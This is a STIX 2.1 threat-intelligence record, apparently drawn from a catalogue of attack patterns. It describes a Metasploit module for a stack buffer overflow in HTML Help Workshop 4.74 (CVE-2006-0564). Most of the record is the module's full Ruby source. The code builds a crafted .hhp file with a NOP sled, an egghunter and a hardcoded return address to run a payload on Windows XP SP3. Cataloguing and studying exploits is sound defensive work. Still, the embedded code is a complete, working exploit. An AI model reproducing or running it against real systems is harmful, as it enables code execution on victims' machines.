{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3246adcf-713d-4521-9b07-7cd55e898a6f",
    "created": "2024-08-14T16:35:33.436743Z",
    "modified": "2024-08-14T16:35:33.436747Z",
    "name": "HTML Help Workshop 4.74 (hhp Project File) Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HTML Help Workshop 4.74 by creating a specially crafted hhp file.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/hhw_hhp_contentfile_bof.rb",
            "external_id": "hhw_hhp_contentfile_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-0564"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HTML Help Workshop 4.74 (hhp Project File) Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HTML Help Workshop 4.74\n          by creating a specially crafted hhp file.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'bratax', 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2006-0564' ],\n          [ 'OSVDB', '22941' ],\n          [ 'EDB', '1470' ],\n          [ 'EDB', '1495' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x1a\\x2f\\x5c\",\n          'StackAdjustment' => -4800,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP English SP3', { 'Offset' => 280, 'Ret' => 0x00401F93 } ], # CALL EDI hhw.exe v4.74.8702.0\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2006-02-06',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME',   [ false, 'The file name.', 'msf.hhp']),\n      ])\n  end\n\n  def exploit\n\n    # use the egghunter!\n    eh_stub, eh_egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n\n    off = target['Offset']\n    idxf = \"\"\n    idxf << make_nops(off - eh_stub.length)\n    idxf << eh_stub\n    idxf << [target.ret].pack('V')\n\n    sploit = \"[OPTIONS]\\r\\n\"\n    sploit << \"Contents file=\"\n    sploit << idxf\n    sploit << \"\\r\\n\"\n    sploit << \"\\r\\n\"\n    sploit << \"[FILES]\\r\\n\"\n    sploit << \"\\r\\n\"\n    sploit << eh_egg\n\n    hhp = sploit\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(hhp)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-02-06",
    "x_mitre_platforms": [
        "win'"
    ]
}